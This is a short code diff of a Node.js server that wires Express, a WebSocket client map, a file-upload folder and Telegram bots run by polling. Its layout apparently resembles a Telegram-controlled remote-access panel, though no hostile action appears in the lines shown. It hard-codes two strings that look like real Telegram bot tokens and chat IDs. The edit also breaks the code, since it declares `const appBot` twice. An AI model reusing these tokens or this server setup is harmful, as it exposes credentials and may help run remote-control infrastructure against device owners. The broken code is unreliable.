@@ -9,13 +9,15 @@ const axios = require("axios");
 
 const token1 = '7927892535:AAG_fCJnzXzksWJxtYAvhAKGW8Xe68BGLMs'
 const token2 = '7310256623:AAFUhACl1MD69JAG5cIO4ls5oQb2AAi70f4'
-const id =  '5862097316,5552922436'
+const id =  ['5862097316','5552922436']
 const address = 'https://www.google.com'
 
 const app = express();
 const appServer = http.createServer(app);
 const appSocket = new webSocket.Server({server: appServer});
-const appBot = new telegramBot(token1,token2, {polling: true});
+const appBot = new telegramBot(token1, {polling: true});
+const appBot = new telegramBot(token2, {polling: true});
+
 const appClients = new Map()
 
 const upload = multer({ dest: 'uploadedFile/' });
